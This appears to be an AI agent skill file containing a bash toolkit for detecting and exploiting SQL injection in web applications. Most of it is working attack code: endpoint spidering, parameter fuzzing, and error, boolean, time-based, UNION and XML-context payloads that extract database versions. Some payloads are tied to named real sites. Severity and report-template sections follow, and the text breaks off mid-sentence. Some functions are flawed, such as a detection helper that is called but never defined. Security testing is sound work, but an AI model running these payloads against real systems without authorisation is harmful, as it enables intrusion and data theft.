---
description: Find SQLI vulnerabilities in web applications. Use when testing for SQLI issues.
---

# SQL Injection Detection Tool

## High-Value Patterns from Real Reports

### Common Vulnerable Parameters
```bash
# Parameter names frequently vulnerable to SQLI
VULNERABLE_PARAMS=(
    "id" "ctx" "limit" "search" "scn" "COURSEID" "SUBJECT"
    "acctid" "log" "multi_layer_map_list" "city_id" "last_content_id"
    "last_id" "regId" "locationId" "locId" "validateemail" "sort"
    "offset" "organization_id" "ref" "opt" "FP_LK_USER_LOGIN"
    "FP_POINT_CODE" "term" "country_code" "send_rec_type" "action"
)

# Vulnerable endpoint patterns
ENDPOINT_PATTERNS=(
    "/webApp/*" "/ajax/*" "/api/*" "/*ajax*" "/filter/*"
    "/js/*" "/dashboard/*" "/reader_api/*" "changeReplaceOpt.php"
    "imgview.html" "leasib.php" "reset_password" "cancel_*"
    "updatemailinfo" "importStatus.php" "csv_to_json"
)

# Headers that may be vulnerable
VULNERABLE_HEADERS=(
    "User-Agent" "X-Forwarded-For" "Referer" "Cookie"
)
```

## Discovery Commands

### 1. Endpoint Discovery
```bash
# Find potential SQLI endpoints
find_sqli_endpoints() {
    local target=$1
    
    # Spider common paths
    for pattern in "${ENDPOINT_PATTERNS[@]}"; do
        curl -s -I "$target$pattern" | grep -q "200\|302" && echo "Found: $target$pattern"
    done
    
    # Check robots.txt for hidden paths
    curl -s "$target/robots.txt" | grep -E "Disallow:|Allow:" | cut -d: -f2 | while read path; do
        curl -s -I "$target$path" | grep -q "200\|302" && echo "Found: $target$path"
    done
}

# Usage: find_sqli_endpoints "https://target.com"
```

### 2. Parameter Fuzzing
```bash
# Fuzz for vulnerable parameters
fuzz_parameters() {
    local url=$1
    local method=${2:-GET}
    
    for param in "${VULNERABLE_PARAMS[@]}"; do
        if [[ "$method" == "GET" ]]; then
            test_url="$url?$param=1"
        else
            test_url="$url"
        fi
        
        # Test basic error-based payload
        if [[ "$method" == "GET" ]]; then
            response=$(curl -s "$url?$param=1'")
        else
            response=$(curl -s -X POST -d "$param=1'" "$url")
        fi
        
        # Check for SQL error indicators
        if echo "$response" | grep -qi "sql\|mysql\|postgresql\|oracle\|error\|syntax\|column"; then
            echo "Potential SQLI in parameter: $param at $url"
        fi
    done
}
```

## Step-by-Step Testing Methodology

### 1. Basic Error Detection
```bash
# Test for SQL errors with single quote
test_basic_errors() {
    local url=$1
    local param=$2
    
    echo "Testing basic errors for $param at $url"
    
    # Single quote test
    response=$(curl -s "$url?$param=1'")
    if echo "$response" | grep -qi "sql\|mysql\|error\|syntax"; then
        echo "[+] SQL Error detected with single quote"
        return 0
    fi
    
    # Double quote test  
    response=$(curl -s "$url?$param=1\"")
    if echo "$response" | grep -qi "sql\|mysql\|error\|syntax"; then
        echo "[+] SQL Error detected with double quote"
        return 0
    fi
    
    return 1
}
```

### 2. Boolean-Based Detection
```bash
# Test boolean-based blind SQLI
test_boolean_blind() {
    local url=$1
    local param=$2
    
    echo "Testing boolean-based blind SQLI for $param"
    
    # True condition
    true_response=$(curl -s "$url?$param=1 AND 1=1")
    true_length=$(echo "$true_response" | wc -c)
    
    # False condition
    false_response=$(curl -s "$url?$param=1 AND 1=2")
    false_length=$(echo "$false_response" | wc -c)
    
    # Compare response lengths
    if [[ $true_length -ne $false_length ]]; then
        echo "[+] Boolean-based blind SQLI detected"
        echo "True response length: $true_length"
        echo "False response length: $false_length"
        return 0
    fi
    
    return 1
}
```

### 3. Time-Based Detection
```bash
# Test time-based blind SQLI
test_time_based() {
    local url=$1
    local param=$2
    
    echo "Testing time-based blind SQLI for $param"
    
    # MySQL sleep payload
    start_time=$(date +%s)
    curl -s "$url?$param=1' AND SLEEP(5) --" > /dev/null
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    
    if [[ $duration -ge 5 ]]; then
        echo "[+] MySQL time-based SQLI detected (${duration}s delay)"
        return 0
    fi
    
    # PostgreSQL sleep payload
    start_time=$(date +%s)
    curl -s "$url?$param=1' AND pg_sleep(5) --" > /dev/null
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    
    if [[ $duration -ge 5 ]]; then
        echo "[+] PostgreSQL time-based SQLI detected (${duration}s delay)"
        return 0
    fi
    
    return 1
}
```

### 4. Union-Based Detection
```bash
# Test union-based SQLI
test_union_based() {
    local url=$1
    local param=$2
    
    echo "Testing union-based SQLI for $param"
    
    # Test different column counts
    for cols in {1..10}; do
        union_payload=$(printf "1' UNION SELECT %s --" $(seq -s, 1 $cols))
        response=$(curl -s "$url?$param=$union_payload")
        
        # Check if union succeeded (no error about column count)
        if ! echo "$response" | grep -qi "column.*count\|columns.*differ"; then
            echo "[+] Union-based SQLI detected with $cols columns"
            
            # Try to extract version info
            version_payload=$(printf "1' UNION SELECT %s --" $(seq -s, 1 $((cols-1))) "version()")
            version_response=$(curl -s "$url?$param=$version_payload")
            echo "Version info attempt: $version_response"
            return 0
        fi
    done
    
    return 1
}
```

### 5. Header-Based Testing
```bash
# Test SQLI in headers
test_header_sqli() {
    local url=$1
    
    echo "Testing SQLI in headers"
    
    for header in "${VULNERABLE_HEADERS[@]}"; do
        # Time-based test in header
        start_time=$(date +%s)
        if [[ "$header" == "User-Agent" ]]; then
            curl -s -H "$header: Mozilla'XOR(if(now()=sysdate(),sleep(5),0))OR'" "$url" > /dev/null
        elif [[ "$header" == "Cookie" ]]; then
            curl -s -H "$header: test=1'XOR(if(now()=sysdate(),sleep(5),0))OR'" "$url" > /dev/null
        else
            curl -s -H "$header: 1'XOR(if(now()=sysdate(),sleep(5),0))OR'" "$url" > /dev/null
        fi
        end_time=$(date +%s)
        duration=$((end_time - start_time))
        
        if [[ $duration -ge 5 ]]; then
            echo "[+] Time-based SQLI detected in $header header"
        fi
    done
}
```

## Concrete Testing Examples

### PostgreSQL Detection (viestinta.lahitapiola.fi pattern)
```bash
# Test PostgreSQL version detection
test_postgresql() {
    local url=$1
    local param=$2
    
    # True condition - PostgreSQL version check
    true_payload="$param=1 and substr(version(),1,10)='PostgreSQL'"
    true_response=$(curl -s "$url?$true_payload")
    
    # False condition
    false_payload="$param=1 and substr(version(),1,10)='PostgreXXX'"  
    false_response=$(curl -s "$url?$false_payload")
    
    if [[ "$true_response" != "$false_response" ]]; then
        echo "[+] PostgreSQL SQLI detected"
        echo "True response contains: $(echo "$true_response" | head -c 100)"
        echo "False response contains: $(echo "$false_response" | head -c 100)"
    fi
}
```

### MySQL Union Detection (mail.ru pattern)
```bash
# Test MySQL union-based SQLI
test_mysql_union() {
    local url=$1
    local param=$2
    
    # Union payload to extract version
    payload="$param=1 and 0 union select concat_ws(0x2c,version(),@@version_compile_os)"
    response=$(curl -s "$url?$payload")
    
    # Check for MySQL version in response
    if echo "$response" | grep -qE "[0-9]+\.[0-9]+\.[0-9]+-.*-log"; then
        echo "[+] MySQL Union-based SQLI detected"
        extracted=$(echo "$response" | grep -oE "[0-9]+\.[0-9]+\.[0-9]+-.*-log.*")
        echo "Extracted version: $extracted"
    fi
}
```

### XML Context SQLI (ctx parameter pattern)
```bash
# Test SQLI in XML context
test_xml_sqli() {
    local url=$1
    
    # URL-encoded XML with SQLI payload
    payload="ctx=%3Cctx%3E%3Cvars%3E%3Cemail%3Etest%40test.ru' and substr(version(),1,10) = 'PostgreSQL' and '1%3C%2Femail%3E%3C%2Fvars%3E%3C%2Fctx%3E"
    
    response=$(curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "$payload&userAction=next" "$url")
    
    # Check for success indicators vs error
    if echo "$response" | grep -q "Kiitos\|success\|thank"; then
        echo "[+] XML context SQLI detected - success response"
    elif echo "$response" | grep -q "error\|Error"; then
        # Test false condition
        false_payload=${payload//PostgreSQL/PostgreXXX}
        false_response=$(curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "$false_payload&userAction=next" "$url")
        
        if [[ "$response" != "$false_response" ]]; then
            echo "[+] XML context boolean SQLI detected"
        fi
    fi
}
```

## Complete Testing Function
```bash
# Main SQLI testing function
test_sqli() {
    local target_url=$1
    
    echo "=== Starting SQLI Testing for $target_url ==="
    
    # Extract base URL and test parameters
    if [[ "$target_url" == *"?"* ]]; then
        base_url=$(echo "$target_url" | cut -d'?' -f1)
        query_string=$(echo "$target_url" | cut -d'?' -f2-)
        
        # Test each parameter
        IFS='&' read -ra PARAMS <<< "$query_string"
        for param_pair in "${PARAMS[@]}"; do
            param_name=$(echo "$param_pair" | cut -d'=' -f1)
            echo "Testing parameter: $param_name"
            
            test_basic_errors "$base_url" "$param_name"
            test_boolean_blind "$base_url" "$param_name"  
            test_time_based "$base_url" "$param_name"
            test_union_based "$base_url" "$param_name"
            test_postgresql "$base_url" "$param_name"
            test_mysql_union "$base_url" "$param_name"
        done
    else
        # Test common parameters
        for param in "${VULNERABLE_PARAMS[@]}"; do
            echo "Testing parameter: $param"
            test_basic_errors "$target_url" "$param"
            test_boolean_blind "$target_url" "$param"
            test_time_based "$target_url" "$param" 
            test_union_based "$target_url" "$param"
        done
    fi
    
    # Test headers
    test_header_sqli "$target_url"
    
    # Test XML context if applicable
    if [[ "$target_url" == *"webApp"* ]]; then
        test_xml_sqli "$target_url"
    fi
    
    echo "=== SQLI Testing Complete ==="
}
```

## Severity Rating Table

| Severity | Criteria | Examples |
|----------|----------|----------|
| **Critical** | Data extraction, RCE possible, authentication bypass | Union-based with full database access, RCE via file operations |
| **High** | Blind SQLI with data extraction capability | Time-based blind allowing full data enumeration |
| **Medium** | Boolean blind SQLI, limited data extraction | Boolean-based blind with response differences |
| **Low** | Error-based info disclosure, no extraction | SQL errors revealing database type/version only |

## False Positives to Ignore

```bash
# Check for common false positives
is_false_positive() {
    local response=$1
    
    # Generic error pages
    if echo "$response" | grep -qi "404.*not.*found\|403.*forbidden\|500.*internal.*server"; then
        echo "Generic HTTP error - likely false positive"
        return 0
    fi
    
    # WAF/IDS responses
    if echo "$response" | grep -qi "blocked\|security.*violation\|access.*denied\|malicious"; then
        echo "WAF/IDS detection - not vulnerable"
        return 0
    fi
    
    # Application errors unrelated to SQL
    if echo "$response" | grep -qi "invalid.*parameter\|missing.*required\|validation.*error"; then
        echo "Application validation error - likely false positive"
        return 0
    fi
    
    return 1
}
```

## Finding Report Template

```bash
# Generate SQLI vulnerability report
generate_sqli_report() {
    local url=$1
    local param=$2
    local payload=$3
    local evidence=$4
    local severity=$5
    
    cat << EOF
# SQL Injection Vulnerability Report

## Summary
SQL Injection vulnerability found in parameter '$param' at $url

## Vulnerable Details
- **URL**: $url
- **Parameter**: $param  
- **Method**: GET/POST
- **Database**: $(detect_db_type "$evidence")

## Proof of Concept
\`\`\`
Payload: $payload
Evidence: $evidence
\`\`\`

## Steps to Reproduce
1. Navigate to $url
2. Inject payload in parameter '$param': $payload
3. Observe response indicating SQL injection

## Impact
$severity severity SQL injection allowing:
- Database information disclosure
- Potential data extraction
- Possible authentication bypass
- Risk of remote code execution

## Remediation
- Use parameterized queries/prepared statements
- Input validation and sanitization
- Principle of least privilege for